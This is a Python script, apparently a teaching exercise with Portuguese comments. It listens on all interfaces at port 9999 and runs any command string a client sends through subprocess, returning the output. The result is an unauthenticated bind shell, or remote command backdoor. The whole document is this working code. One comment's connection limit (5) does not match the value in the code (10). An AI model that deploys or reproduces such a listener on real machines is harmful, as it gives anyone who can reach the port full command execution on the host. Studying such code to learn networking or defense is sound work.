import subprocess
import socket
import threading

bind_ip = "0.0.0.0"  # Aceita conexão de qualquer origem
bind_port = 9999  # Porta que o servidor "escuta"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Cria socket utilizando protocolo IPv4 e protocolo TCP

server.bind((bind_ip, bind_port))  # Atribui ao socket endereço e porta de conexão

server.listen(10)  # Define que o servidor está pronto para receber conexões com no máximo 5

print("[*] Listening on", bind_ip, ":", bind_port)  # Imprime os endereços IP e Porta que o servidor está sendo executado


def handle_client(client_socket):
    request = client_socket.recv(8192)  # Recebe dados do socket remoto em um determinado tamanho de buffer

    # Converte a mensagem de byte para string e imprime a mensagem recebida separada por espaços em branco
    print("[*] Received:", str(request, "utf-8").split(" "))

    # Executa o comando no terminal do SO e retorna o resultado
    result = subprocess.run(str(request, "utf-8").split(" "), stdout=subprocess.PIPE)
    client_socket.send(result.stdout)  # Envia conjunto de bytes (mensagens) para o socket remoto
    client_socket.close()  # Fecha conexão com o socket remoto


while True:
    # Bloqueia o serviço até receber um pedido de conexão com os valores de conexão (socket cliente) e endereço
    client, addr = server.accept()

    print("[*] Accepted connection from:", addr[0], ":", addr[1])  # Imprime os endereços IP e Porta respectivamente

    # Cria uma thread passando como parâmetros a função handle_client e o socket do cliente
    client_handler = threading.Thread(target=handle_client, args=(client,))
    client_handler.start()  # Inicia a thread
